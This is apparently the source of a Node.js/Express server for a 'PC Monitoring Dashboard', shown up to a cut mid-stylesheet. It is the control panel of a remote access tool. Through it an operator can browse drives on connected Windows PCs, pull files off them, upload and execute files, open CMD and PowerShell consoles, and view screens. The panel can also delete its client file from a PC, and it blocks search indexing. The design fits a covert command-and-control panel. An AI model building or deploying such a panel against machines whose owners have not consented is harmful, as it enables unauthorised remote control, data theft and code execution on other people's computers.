const express = require('express');
const session = require('express-session');
const multer = require('multer');
const path = require('path');
const dotenv = require('dotenv');

dotenv.config();

const app = express();
const PORT = process.env.PORT;
const DASHBOARD_USER = process.env.DASHBOARD_USER;
const DASHBOARD_PASS = process.env.DASHBOARD_PASS;
const CLIENT_KEY = process.env.CLIENT_KEY;
const SESSION_SECRET = process.env.SESSION_SECRET;

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });

const clients = new Map();
const pendingCommands = new Map();
const taskResults = new Map();

function authenticateClient(req, res, next) {
  const authHeader = req.headers['x-client-key'];
  if (authHeader && authHeader === CLIENT_KEY) {
    return next();
  }
  return res.status(403).json({ error: 'Forbidden: Invalid Client Key' });
}

app.use(express.json({ limit: '60mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));

function checkAuth(req, res, next) {
  if (req.session.authenticated) {
    return next();
  }
  res.redirect('/login');
}

function checkAuthApi(req, res, next) {
  if (req.session.authenticated) {
    return next();
  }
  res.status(401).json({ error: 'Not authenticated' });
}

// ========== SECURITY & ANTI-SCRAPING MIDDLEWARE ==========

app.use((req, res, next) => {
  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  next();
});

app.get('/robots.txt', (req, res) => {
  res.type('text/plain');
  res.send('User-agent: *\nDisallow: /');
});

function generateMathPuzzle(req) {
  const num1 = Math.floor(Math.random() * 20) + 1;
  const num2 = Math.floor(Math.random() * 20) + 1;
  const answer = num1 + num2;
  req.session.mathAnswer = answer;
  return { num1, num2, question: `${num1} + ${num2}` };
}

// ========== LOGIN ==========

app.get('/login', (req, res) => {
  if (req.session.authenticated) {
    return res.redirect('/');
  }
  const puzzle = generateMathPuzzle(req);
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="robots" content="noindex, nofollow">
      <title>System Login</title>
      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
      <style>
        body {
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          background-color: #f8fafc;
          color: #1e293b;
          display: flex;
          align-items: center;
          justify-content: center;
          height: 100vh;
          margin: 0;
        }
        .login-card {
          background: #ffffff;
          padding: 2.5rem;
          border-radius: 6px;
          border: 1px solid #e2e8f0;
          box-shadow: 0 1px 3px rgba(0,0,0,0.05);
          width: 340px;
        }
        .header {
          display: flex;
          align-items: center;
          gap: 0.5rem;
          margin-bottom: 1.5rem;
        }
        .header h2 {
          margin: 0;
          font-size: 1.25rem;
          font-weight: 600;
        }
        .icon {
          font-family: 'Material Symbols Outlined';
          font-size: 1.5rem;
          color: #64748b;
        }
        .form-group {
          margin-bottom: 1.25rem;
        }
        .form-group label {
          display: block;
          margin-bottom: 0.5rem;
          font-size: 0.875rem;
          font-weight: 500;
        }
        .form-group input {
          width: 100%;
          padding: 0.5rem;
          box-sizing: border-box;
          border: 1px solid #cbd5e1;
          border-radius: 4px;
          font-size: 0.875rem;
          background-color: #f8fafc;
        }
        .form-group input:focus {
          outline: none;
          border-color: #94a3b8;
        }
        .captcha-box {
          background-color: #f1f5f9;
          border: 1px solid #cbd5e1;
          padding: 0.75rem;
          border-radius: 4px;
          margin-bottom: 1.25rem;
        }
        .captcha-label {
          font-size: 0.875rem;
          font-weight: 600;
          margin-bottom: 0.5rem;
          color: #334155;
        }
        button {
          width: 100%;
          padding: 0.625rem;
          background-color: #0f172a;
          color: #ffffff;
          border: none;
          border-radius: 4px;
          font-weight: 500;
          font-size: 0.875rem;
          cursor: pointer;
        }
        button:hover {
          background-color: #1e293b;
        }
        .error {
          color: #ef4444;
          font-size: 0.875rem;
          margin-bottom: 1rem;
        }
      </style>
    </head>
    <body>
      <div class="login-card">
        <div class="header">
          <span class="icon">lock</span>
          <h2>System Login</h2>
        </div>
        ${req.query.error === 'captcha' ? '<div class="error">Incorrect math answer</div>' : ''}
        ${req.query.error === '1' ? '<div class="error">Invalid credentials</div>' : ''}
        <form action="/login" method="POST">
          <div class="form-group">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" required autocomplete="off">
          </div>
          <div class="form-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
          </div>
          <div class="captcha-box">
            <div class="captcha-label">Security Verification: What is ${puzzle.question}?</div>
            <input type="number" id="captcha" name="captcha" placeholder="Enter answer" required style="width:100%; padding:0.5rem; border:1px solid #cbd5e1; border-radius:4px; box-sizing:border-box;">
          </div>
          <button type="submit">Log In</button>
        </form>
      </div>
    </body>
    </html>
  `);
});

app.post('/login', (req, res) => {
  const { username, password, captcha } = req.body;
  const expectedCaptcha = req.session.mathAnswer;
  
  if (!captcha || parseInt(captcha, 10) !== expectedCaptcha) {
    return res.redirect('/login?error=captcha');
  }

  if (username === DASHBOARD_USER && password === DASHBOARD_PASS) {
    req.session.authenticated = true;
    delete req.session.mathAnswer;
    return res.redirect('/');
  }
  res.redirect('/login?error=1');
});

app.get('/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/login');
});

// ========== DASHBOARD ==========

app.get('/', checkAuth, (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Company PC Monitor</title>
      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
      <style>
        body {
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          background-color: #f8fafc;
          color: #1e293b;
          margin: 0;
          padding: 2rem;
        }
        .container {
          max-width: 1200px;
          margin: 0 auto;
        }
        .header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 2rem;
          border-bottom: 1px solid #e2e8f0;
          padding-bottom: 1rem;
        }
        .header h1 {
          margin: 0;
          font-size: 1.5rem;
          font-weight: 700;
          display: flex;
          align-items: center;
          gap: 0.5rem;
        }
        .header-actions {
          display: flex;
          align-items: center;
          gap: 1.5rem;
        }
        .refresh-btn {
          display: flex;
          align-items: center;
          gap: 0.25rem;
          background: none;
          border: none;
          color: #64748b;
          font-size: 0.875rem;
          font-weight: 500;
          cursor: pointer;
          padding: 0;
          width: auto;
        }
        .refresh-btn:hover {
          color: #0f172a;
        }
        .refresh-btn.spinning .refresh-icon {
          animation: spin 0.6s linear;
        }
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        .icon {
          font-family: 'Material Symbols Outlined';
          font-size: 1.25rem;
        }
        table {
          width: 100%;
          border-collapse: collapse;
          background: #ffffff;
          border: 1px solid #e2e8f0;
          border-radius: 6px;
          overflow: hidden;
        }
        th, td {
          padding: 1rem;
          text-align: left;
          border-bottom: 1px solid #e2e8f0;
          font-size: 0.875rem;
        }
        th {
          background-color: #f1f5f9;
          font-weight: 600;
          color: #475569;
        }
        tr:last-child td {
          border-bottom: none;
        }
        .status-cell {
          display: flex;
          align-items: center;
          gap: 0.5rem;
        }
        .status-dot {
          width: 8px;
          height: 8px;
          border-radius: 50%;
        }
        .status-active {
          background-color: #22c55e;
        }
        .status-inactive {
          background-color: #ef4444;
        }
        .remove-btn {
          display: inline-flex;
          align-items: center;
          gap: 0.25rem;
          padding: 0.35rem 0.75rem;
          background-color: #fee2e2;
          color: #dc2626;
          border: 1px solid #fecaca;
          border-radius: 4px;
          font-size: 0.8rem;
          font-weight: 500;
          cursor: pointer;
          transition: background-color 0.15s;
          width: auto;
        }
        .remove-btn:hover {
          background-color: #fecaca;
        }
        .files-btn {
          display: inline-flex;
          align-items: center;
          gap: 0.25rem;
          padding: 0.35rem 0.75rem;
          background-color: #e0f2fe;
          color: #0369a1;
          border: 1px solid #bae6fd;
          border-radius: 4px;
          font-size: 0.8rem;
          font-weight: 500;
          cursor: pointer;
          transition: background-color 0.15s;
          text-decoration: none;
          width: auto;
        }
        .files-btn:hover {
          background-color: #bae6fd;
        }
        .cmd-btn {
          display: inline-flex;
          align-items: center;
          gap: 0.25rem;
          padding: 0.35rem 0.75rem;
          background-color: #1a1a2e;
          color: #4ec9b0;
          border: 1px solid #16213e;
          border-radius: 4px;
          font-size: 0.8rem;
          font-weight: 500;
          cursor: pointer;
          transition: background-color 0.15s;
          text-decoration: none;
          width: auto;
        }
        .cmd-btn:hover {
          background-color: #16213e;
        }
        .ps-btn {
          display: inline-flex;
          align-items: center;
          gap: 0.25rem;
          padding: 0.35rem 0.75rem;
          background-color: #012456;
          color: #569cd6;
          border: 1px solid #003366;
          border-radius: 4px;
          font-size: 0.8rem;
          font-weight: 500;
          cursor: pointer;
          transition: background-color 0.15s;
          text-decoration: none;
          width: auto;
        }
        .ps-btn:hover {
          background-color: #003366;
        }
        .action-cell {
          display: flex;
          align-items: center;
          gap: 0.5rem;
        }
        .delete-check {
          display: flex;
          align-items: center;
          gap: 0.3rem;
          font-size: 0.8rem;
          color: #64748b;
        }
        .delete-check input[type="checkbox"] {
          margin: 0;
          cursor: pointer;
        }
        /* Modal Styles */
        .modal {
          display: none;
          position: fixed;
          top: 0; left: 0; width: 100%; height: 100%;
          background: rgba(15, 23, 42, 0.4);
          z-index: 1000;
          align-items: center;
          justify-content: center;
        }
        .modal.active {
          display: flex;
        }
        .modal-content {
          background: #ffffff;
          padding: 2rem;
          border-radius: 6px;
          border: 1px solid #e2e8f0;
          box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -1px rgba(0,0,0,0.06);
          width: 400px;
          max-width: 90%;
        }
        .modal-title {
          margin-top: 0;
          font-size: 1.15rem;
          font-weight: 600;
          margin-bottom: 1rem;
        }
        .modal-body {
          font-size: 0.875rem;
          color: #475569;
          margin-bottom: 1.5rem;
          line-height: 1.5;
        }
        .modal-checkbox-wrapper {
          margin-bottom: 1.5rem;
          display: flex;
          align-items: center;
          gap: 0.5rem;
          font-size: 0.875rem;
          font-weight: 500;
        }
        .modal-checkbox-wrapper input {
          cursor: pointer;
        }
        .modal-actions {
          display: flex;
          justify-content: flex-end;
          gap: 0.75rem;
        }
        .modal-btn {
          padding: 0.5rem 1rem;
          border-radius: 4px;
          font-size: 0.875rem;
          font-weight: 500;
          cursor: pointer;
          border: none;
          width: auto;
        }
        .modal-btn-cancel {
          background-color: #f1f5f9;
          color: #475569;
        }
        .modal-btn-cancel:hover {
          background-color: #e2e8f0;
        }
        .modal-btn-confirm {
          background-color: #dc2626;
          color: #ffffff;
        }
        .modal-btn-confirm:hover {
          background-color: #b91c1c;
        }
      </style>
      <script>
        var clientToRemove = null;

        function showRemoveModal(key) {
          clientToRemove = key;
          document.getElementById('modal-client-name').textContent = key;
          document.getElementById('modal-delete-file').checked = false;
          document.getElementById('remove-modal').classList.add('active');
        }

        function closeRemoveModal() {
          clientToRemove = null;
          document.getElementById('remove-modal').classList.remove('active');
        }

        function confirmRemove() {
          if (!clientToRemove) return;
          var deleteFile = document.getElementById('modal-delete-file').checked;
          
          fetch('/api/remove', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ key: clientToRemove, deleteFile: deleteFile })
          })
          .then(function(res) { return res.json(); })
          .then(function(data) {
            if (data.success) { 
              loadClients();
              closeRemoveModal();
            }
          })
          .catch(function() {
            closeRemoveModal();
          });
        }

        function loadClients() {
          var btn = document.getElementById('refresh-button');
          if (btn) {
            btn.classList.add('spinning');
            setTimeout(function() { btn.classList.remove('spinning'); }, 600);
          }
          fetch('/api/clients')
            .then(function(res) { return res.json(); })
            .then(function(data) {
              var tbody = document.getElementById('client-list');
              tbody.innerHTML = '';
              if (data.length === 0) {
                tbody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: #64748b;">No devices connected</td></tr>';
                return;
              }
              data.forEach(function(client) {
                var tr = document.createElement('tr');
                var lastSeenDate = new Date(client.lastSeen).toLocaleTimeString();
                var statusDot = client.active ? '<span class="status-dot status-active"></span>Active' : '<span class="status-dot status-inactive"></span>Inactive';
                var encodedKey = encodeURIComponent(client.name);
                var td1 = '<td>' + client.name + '</td>';
                var td2 = '<td>' + client.ip + '</td>';
                var td3 = '<td><div class="status-cell">' + statusDot + '</div></td>';
                var td4 = '<td>' + lastSeenDate + '</td>';
                var td5 = '<td><div class="action-cell">' +
                  '<a class="files-btn" href="/files/' + encodedKey + '" target="_blank"><span class="icon" style="font-size:1rem">folder</span>Files</a>' +
                  '<a class="cmd-btn" href="/console/' + encodedKey + '/cmd" target="_blank"><span class="icon" style="font-size:1rem">terminal</span>CMD</a>' +
                  '<a class="ps-btn" href="/console/' + encodedKey + '/powershell" target="_blank"><span class="icon" style="font-size:1rem">terminal</span>PS</a>' +
                  '<a class="files-btn" href="/screenshare/' + encodedKey + '" target="_blank" style="background-color:#ecfdf5;color:#065f46;border-color:#a7f3d0;"><span class="icon" style="font-size:1rem">screenshot_monitor</span>Screen</a>' +
                  '<button class="remove-btn" data-key="' + client.name + '"><span class="icon" style="font-size:1rem">delete</span>Remove</button>' +
                  '</div></td>';
                tr.innerHTML = td1 + td2 + td3 + td4 + td5;
                tr.querySelector('.remove-btn').addEventListener('click', function() {
                  showRemoveModal(this.getAttribute('data-key'));
                });
                tbody.appendChild(tr);
              });
            })
            .catch(function() {});
        }
        setInterval(loadClients, 3000);
        window.onload = loadClients;
      </script>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1><span class="icon">monitoring</span>PC Monitoring Dashboard</h1>
          <div class="header-actions">
            <button onclick="loadClients()" id="refresh-button" class="refresh-btn"><span class="icon refresh-icon">refresh</span>Refresh</button>
            <a href="/logout" class="logout-btn" style="display: flex; align-items: center; gap: 0.25rem; text-decoration: none; color: #64748b; font-size: 0.875rem; font-weight: 500;"><span class="icon">logout</span>Log Out</a>
          </div>
        </div>
        <table>
          <thead>
            <tr>
              <th>PC Name (IP/Username)</th>
              <th>IP Address</th>
              <th>Status</th>
              <th>Last Heartbeat</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody id="client-list">
            <tr>
              <td colspan="5" style="text-align: center; color: #64748b;">Loading devices...</td>
            </tr>
          </tbody>
        </table>
      </div>

      <div id="remove-modal" class="modal">
        <div class="modal-content">
          <h3 class="modal-title">Remove Device</h3>
          <p class="modal-body">
            Are you sure you want to remove the PC <strong id="modal-client-name"></strong>?
          </p>
          <div class="modal-checkbox-wrapper">
            <label style="display: flex; align-items: center; gap: 0.5rem; cursor: pointer;">
              <input type="checkbox" id="modal-delete-file"> Delete client file from PC
            </label>
          </div>
          <div class="modal-actions">
            <button class="modal-btn modal-btn-cancel" onclick="closeRemoveModal()">Cancel</button>
            <button class="modal-btn modal-btn-confirm" onclick="confirmRemove()">Remove</button>
          </div>
        </div>
      </div>
    </body>
    </html>
  `);
});

// ========== FILE EXPLORER PAGE ==========

app.get('/files/:clientKey', checkAuth, (req, res) => {
  const clientKey = decodeURIComponent(req.params.clientKey);
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Files - ` + clientKey + `</title>
      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
      <style>
        * { box-sizing: border-box; }
        body {
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          background-color: #f8fafc;
          color: #1e293b;
          margin: 0;
          padding: 2rem;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
          display: flex; justify-content: space-between; align-items: center;
          margin-bottom: 1.5rem; border-bottom: 1px solid #e2e8f0; padding-bottom: 1rem;
        }
        .header h1 { margin: 0; font-size: 1.25rem; font-weight: 700; display: flex; align-items: center; gap: 0.5rem; }
        .icon { font-family: 'Material Symbols Outlined'; font-size: 1.25rem; }
        .toolbar {
          display: flex; align-items: center; gap: 0.75rem; margin-bottom: 1rem;
          background: #fff; padding: 0.75rem 1rem; border: 1px solid #e2e8f0; border-radius: 6px;
        }
        .drive-select {
          padding: 0.4rem 0.5rem; border: 1px solid #cbd5e1; border-radius: 4px;
          font-size: 0.875rem; background: #f8fafc; cursor: pointer;
        }
        .path-display {
          flex: 1; padding: 0.4rem 0.75rem; background: #f1f5f9; border: 1px solid #e2e8f0;
          border-radius: 4px; font-size: 0.85rem; font-family: monospace; color: #334155;
          overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
        }
        .toolbar-btn {
          display: inline-flex; align-items: center; gap: 0.25rem;
          padding: 0.4rem 0.75rem; border: 1px solid #cbd5e1; border-radius: 4px;
          font-size: 0.8rem; font-weight: 500; cursor: pointer; background: #fff; color: #334155;
          width: auto;
        }
        .toolbar-btn:hover { background: #f1f5f9; }
        .upload-label {
          display: inline-flex; align-items: center; gap: 0.25rem;
          padding: 0.4rem 0.75rem; border: 1px solid #cbd5e1; border-radius: 4px;
          font-size: 0.8rem; font-weight: 500; cursor: pointer; background: #fff; color: #334155;
        }
        .upload-label:hover { background: #f1f5f9; }
        .file-table {
          width: 100%; border-collapse: collapse; background: #fff;
          border: 1px solid #e2e8f0; border-radius: 6px; overflow: hidden;
        }
        .file-table th, .file-table td {
          padding: 0.6rem 1rem; text-align: left; border-bottom: 1px solid #e2e8f0; font-size: 0.85rem;
        }
        .file-table th { background-color: #f1f5f9; font-weight: 600; color: #475569; }
        .file-table tr:last-child td { border-bottom: none; }
        .file-table tr:hover { background-color: #f8fafc; }
        .file-row { cursor: default; }
        .file-row.dir { cursor: pointer; }
        .file-row.dir:hover { background-color: #eff6ff; }
        .file-name { display: flex; align-items: center; gap: 0.5rem; }
        .file-name .icon { font-size: 1.1rem; color: #64748b; }
        .file-name .dir-icon { color: #f59e0b; }
        .file-actions { display: flex; gap: 0.4rem; }
        .file-action-btn {
          display: inline-flex; align-items: center; padding: 0.25rem 0.5rem;
          border: 1px solid #e2e8f0; border-radius: 3px; font-size: 0.75rem;
          cursor: pointer; background: #fff; color: #64748b; width: auto;
        }
        .file-action-btn:hover { background: #f1f5f9; color: #0f172a; }
        .loading-overlay {
          display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
          background: rgba(255,255,255,0.7); z-index: 100;
          justify-content: center; align-items: center; font-size: 1rem; color: #475569;
        }
        .loading-overlay.active { display: flex; }
        .back-link {
          text-decoration: none; color: #64748b; font-size: 0.875rem; font-weight: 500;
          display: flex; align-items: center; gap: 0.25rem;
        }
        .back-link:hover { color: #0f172a; }
        .status-bar {
          margin-top: 0.75rem; padding: 0.5rem 0.75rem; font-size: 0.8rem; color: #64748b;
          background: #fff; border: 1px solid #e2e8f0; border-radius: 4px;
        }
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1><span class="icon">folder_open</span>File Explorer - ` + clientKey + `</h1>
          <a href="/" class="back-link"><span class="icon">arrow_back</span>Dashboard</a>
        </div>
        <div class="toolbar">
          <select id="drive-select" class="drive-select" onchange="changeDrive()">
            <option>Loading...</option>
          </select>
          <div id="current-path" class="path-display">Loading...</div>
          <button class="toolbar-btn" onclick="goUp()"><span class="icon" style="font-size:1rem">arrow_upward</span>Up</button>
          <button class="toolbar-btn" onclick="refreshDir()"><span class="icon" style="font-size:1rem">refresh</span>Refresh</button>
          <label class="upload-label"><span class="icon" style="font-size:1rem">upload</span>Upload<input type="file" id="upload-input" style="display:none" onchange="uploadFile()"></label>
        </div>
        <table class="file-table">
          <thead>
            <tr>
              <th>Name</th>
              <th>Size</th>
              <th>Modified</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody id="file-list">
            <tr><td colspan="4" style="text-align:center;color:#64748b;padding:2rem;">Loading...</td></tr>
          </tbody>
        </table>
        <div id="status-bar" class="status-bar">Ready</div>
      </div>
      <div id="loading-overlay" class="loading-overlay"><span class="icon" style="font-size:2rem;animation:spin 1s linear infinite">progress_activity</span></div>
      <script>
        var CLIENT_KEY = "` + clientKey.replace(/\\/g, '\\\\').replace(/"/g, '\\"') + `";
        var currentPath = "C:\\\\";
        var currentDrives = [];

        function setStatus(msg) {
          document.getElementById('status-bar').textContent = msg;
        }
        function showLoading(on) {
          document.getElementById('loading-overlay').className = on ? 'loading-overlay active' : 'loading-overlay';
        }
        function formatSize(bytes) {
          if (bytes === 0) return '-';
          if (bytes < 1024) return bytes + ' B';
          if (bytes < 1024*1024) return (bytes/1024).toFixed(1) + ' KB';
          if (bytes < 1024*1024*1024) return (bytes/(1024*1024)).toFixed(1) + ' MB';
          return (bytes/(1024*1024*1024)).toFixed(2) + ' GB';
        }
        function sendCommand(action, params) {
          var body = { clientKey: CLIENT_KEY, action: action };
          for (var k in params) { body[k] = params[k]; }
          return fetch('/api/files/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
          }).then(function(r) { return r.json(); });
        }
        function pollResult(taskId, timeout) {
          var start = Date.now();
          timeout = timeout || 30000;
          return new Promise(function(resolve, reject) {
            function poll() {
              fetch('/api/files/result/' + taskId)
                .then(function(r) { return r.json(); })
                .then(function(data) {
                  if (data.status === 'done') {
                    resolve(data.result);
                  } else if (Date.now() - start > timeout) {
                    reject(new Error('Timeout waiting for client response'));
                  } else {
                    setTimeout(poll, 800);
                  }
                })
                .catch(function() {
                  if (Date.now() - start > timeout) reject(new Error('Timeout'));
                  else setTimeout(poll, 800);
                });
            }
            poll();
          });
        }
        function loadDrives() {
          setStatus('Loading drives...');
          showLoading(true);
          sendCommand('list_drives', {}).then(function(data) {
            return pollResult(data.taskId, 15000);
          }).then(function(result) {
            showLoading(false);
            if (result.drives) {
              currentDrives = result.drives;
              var sel = document.getElementById('drive-select');
              sel.innerHTML = '';
              result.drives.forEach(function(d) {
                var opt = document.createElement('option');
                opt.value = d;
                opt.textContent = d;
                sel.appendChild(opt);
              });
              if (result.drives.length > 0) {
                currentPath = result.drives[0] + "\\\\";
                navigateTo(currentPath);
              }
            }
            setStatus('Ready');
          }).catch(function(e) {
            showLoading(false);
            setStatus('Error loading drives: ' + e.message);
          });
        }
        function navigateTo(dirPath) {
          currentPath = dirPath;
          document.getElementById('current-path').textContent = dirPath;
          var driveLetter = dirPath.substring(0, 2);
          var sel = document.getElementById('drive-select');
          for (var i = 0; i < sel.options.length; i++) {
            if (sel.options[i].value === driveLetter) { sel.selectedIndex = i; break; }
          }
          setStatus('Loading ' + dirPath + '...');
          showLoading(true);
          sendCommand('list_dir', { path: dirPath }).then(function(data) {
            return pollResult(data.taskId, 15000);
          }).then(function(result) {
            showLoading(false);
            if (result.error) {
              setStatus('Error: ' + result.error);
              renderFiles([]);
              return;
            }
            renderFiles(result.entries || []);
            setStatus((result.entries || []).length + ' items in ' + dirPath);
          }).catch(function(e) {
            showLoading(false);
            setStatus('Error: ' + e.message);
            renderFiles([]);
          });
        }
        function renderFiles(entries) {
          var tbody = document.getElementById('file-list');
          tbody.innerHTML = '';
          if (entries.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:#64748b;padding:1.5rem;">Empty folder or access denied</td></tr>';
            return;
          }
          entries.forEach(function(entry) {
            var tr = document.createElement('tr');
            tr.className = 'file-row' + (entry.isDir ? ' dir' : '');
            var iconName = entry.isDir ? 'folder' : 'description';
            var iconClass = entry.isDir ? 'icon dir-icon' : 'icon';
            var modified = entry.modified ? new Date(entry.modified).toLocaleString() : '-';
            var actions = '';
            if (!entry.isDir) {
              actions = '<div class="file-actions">' +
                '<button class="file-action-btn" data-action="download" data-path="' + currentPath + entry.name + '"><span class="icon" style="font-size:0.9rem">download</span></button>' +
                '<button class="file-action-btn" data-action="execute" data-path="' + currentPath + entry.name + '"><span class="icon" style="font-size:0.9rem">play_arrow</span></button>' +
                '</div>';
            }
            tr.innerHTML = '<td><div class="file-name"><span class="' + iconClass + '">' + iconName + '</span>' + entry.name + '</div></td>' +
              '<td>' + (entry.isDir ? '-' : formatSize(entry.size)) + '</td>' +
              '<td>' + modified + '</td>' +
              '<td>' + actions + '</td>';
            if (entry.isDir) {
              tr.addEventListener('click', function(e) {
                if (e.target.closest('.file-action-btn')) return;
                var newPath = currentPath;
                if (!newPath.endsWith('\\\\')) newPath += '\\\\';
                newPath += entry.name + '\\\\';
                navigateTo(newPath);
              });
            }
            var dlBtn = tr.querySelector('[data-action="download"]');
            if (dlBtn) {
              dlBtn.addEventListener('click', function(e) {
                e.stopPropagation();
                downloadFile(this.getAttribute('data-path'));
              });
            }
            var exBtn = tr.querySelector('[data-action="execute"]');
            if (exBtn) {
              exBtn.addEventListener('click', function(e) {
                e.stopPropagation();
                executeFile(this.getAttribute('data-path'));
              });
            }
            tbody.appendChild(tr);
          });
        }
        function changeDrive() {
          var sel = document.getElementById('drive-select');
          var drive = sel.value;
          navigateTo(drive + "\\\\");
        }
        function goUp() {
          var parts = currentPath.replace(/\\\\+$/, '').split('\\\\');
          if (parts.length <= 1) return;
          parts.pop();
          var newPath = parts.join('\\\\') + '\\\\';
          navigateTo(newPath);
        }
        function refreshDir() {
          navigateTo(currentPath);
        }
        function downloadFile(filePath) {
          setStatus('Downloading ' + filePath + '...');
          showLoading(true);
          sendCommand('download', { path: filePath }).then(function(data) {
            return pollResult(data.taskId, 60000);
          }).then(function(result) {
            showLoading(false);
            if (result.error) {
              setStatus('Download error: ' + result.error);
              return;
            }
            var raw = atob(result.data);
            var arr = new Uint8Array(raw.length);
            for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
            var blob = new Blob([arr]);
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = result.fileName || 'download';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            setStatus('Downloaded ' + result.fileName);
          }).catch(function(e) {
            showLoading(false);
            setStatus('Download error: ' + e.message);
          });
        }
        function executeFile(filePath) {
          if (!confirm('Execute "' + filePath + '" on remote PC?')) return;
          setStatus('Executing ' + filePath + '...');
          sendCommand('execute', { path: filePath }).then(function(data) {
            return pollResult(data.taskId, 15000);
          }).then(function(result) {
            if (result.error) {
              setStatus('Execute error: ' + result.error);
            } else {
              setStatus('Executed ' + filePath);
            }
          }).catch(function(e) {
            setStatus('Execute error: ' + e.message);
          });
        }
        function uploadFile() {
          var input = document.getElementById('upload-input');
          if (!input.files || !input.files[0]) return;
          var file = input.files[0];
          var reader = new FileReader();
          setStatus('Uploading ' + file.name + '...');
          showLoading(true);
          reader.onload = function() {
            var b64 = reader.result.split(',')[1];
            var targetPath = currentPath;
            if (!targetPath.endsWith('\\\\')) targetPath += '\\\\';
            targetPath += file.name;
            sendCommand('upload', { path: targetPath, data: b64 }).then(function(data) {
              return pollResult(data.taskId, 60000);
            }).then(function(result) {
              showLoading(false);
              input.value = '';
              if (result.error) {
                setStatus('Upload error: ' + result.error);
              } else {
                setStatus('Uploaded ' + file.name);
                refreshDir();
              }
            }).catch(function(e) {
              showLoading(false);
              input.value = '';
              setStatus('Upload error: ' + e.message);
            });
          };
          reader.readAsDataURL(file);
        }
        loadDrives();
      </script>
    </body>
    </html>
  `);
});

// ========== CONSOLE PAGE ==========

app.get('/console/:clientKey/:type', checkAuth, (req, res) => {
  const clientKey = decodeURIComponent(req.params.clientKey);
  const consoleType = req.params.type === 'powershell' ? 'powershell' : 'cmd';
  const isPs = consoleType === 'powershell';
  const promptStr = isPs ? 'PS ' + (clientKey.split('/').pop() || clientKey) + '>' : clientKey.split('/').pop() + '\\>';
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>` + consoleType.toUpperCase() + ` - ` + clientKey + `</title>
      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
      <style>
        * { box-sizing: border-box; }
        body {
          font-family: 'Consolas', 'Courier New', monospace;
          background-color: #0c0c0c;
          color: #cccccc;
          margin: 0;
          height: 100vh;
          display: flex;
          flex-direction: column;
        }
        .header {
          display: flex; justify-content: space-between; align-items: center;
          padding: 0.5rem 1rem; background: #1a1a2e; border-bottom: 1px solid #333;
          flex-shrink: 0;
        }
        .header h1 { margin: 0; font-size: 0.95rem; font-weight: 600; display: flex; align-items: center; gap: 0.5rem; color: #569cd6; }
        .header .client-info { font-size: 0.8rem; color: #888; }
        .icon { font-family: 'Material Symbols Outlined'; font-size: 1.25rem; }
        .back-link {
          text-decoration: none; color: #888; font-size: 0.8rem; font-weight: 500;
          display: flex; align-items: center; gap: 0.25rem;
        }
        .back-link:hover { color: #ccc; }
        .terminal {
          flex: 1;
          overflow-y: auto;
          padding: 0.75rem 1rem;
          white-space: pre-wrap;
          word-break: break-all;
          font-size: 0.85rem;
          line-height: 1.5;
        }
        .terminal .output { color: #cccccc; }
        .terminal .error { color: #f44747; }
        .terminal .echo { color: #569cd6; }
        .terminal .info { color: #6a9955; }
        .input-area {
          display: flex; align-items: center; gap: 0; flex-shrink: 0;
          border-top: 1px solid #333; background: #1a1a1a;
        }
        .prompt {
